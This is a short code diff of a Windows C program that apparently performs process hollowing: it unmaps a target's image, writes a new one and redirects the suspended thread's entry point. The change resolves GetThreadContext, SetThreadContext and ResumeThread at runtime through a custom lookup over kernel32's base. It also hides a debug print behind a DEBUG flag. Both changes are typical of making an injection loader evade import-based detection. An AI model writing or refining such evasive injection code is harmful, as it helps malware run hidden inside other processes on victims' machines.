@@ -72,7 +72,11 @@ typedef BOOL(__stdcall* _ReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
 typedef  NTSTATUS(WINAPI* _NtQueryInformationProcess)(HANDLE , PROCESS_INFORMATION_CLASS,PVOID,ULONG,PULONG);
 typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
 typedef HANDLE(* _GetProcessHeap)();
-typedef LPVOID(__stdcall* _VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD); 
+typedef LPVOID(__stdcall* _VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL (__stdcall *_GetThreadContext)(HANDLE hThread,LPCONTEXT lpContext);
+typedef BOOL(__stdcall* _SetThreadContext)(HANDLE hThread, LPCONTEXT lpContext);
+typedef DWORD (__stdcall * _ResumeThread)(HANDLE hThread);
+
 
 DWORD kernel32_base, ntdll_base; 
 
@@ -341,10 +345,15 @@ int wmain()
 
 		
 		CONTEXT ctx ;
-		ctx.ContextFlags = CONTEXT_INTEGER; 
-		GetThreadContext(blah1.hThread, &ctx);
+		ctx.ContextFlags = CONTEXT_INTEGER;
+		_GetThreadContext GetThreadCont = find_function_address(kernel32_base, "GetThreadContext"); 
+		_SetThreadContext SetThreadCont = find_function_address(kernel32_base, "SetThreadContext");
+		_ResumeThread ResumeThrea = find_function_address(kernel32_base, "ResumeThread"); 
+		GetThreadCont(blah1.hThread, &ctx);
 		ctx.Eax = (DWORD)TargetImageBase + srcNtHeaders->OptionalHeader.AddressOfEntryPoint;
+#ifdef DEBUG
 		printf("\nEntry point Eax = 0x%x",ctx.Eax); 
-		SetThreadContext(blah1.hThread,&ctx);
-		ResumeThread(blah1.hThread);
+#endif
+		SetThreadCont(blah1.hThread,&ctx);
+		ResumeThrea(blah1.hThread);
 }
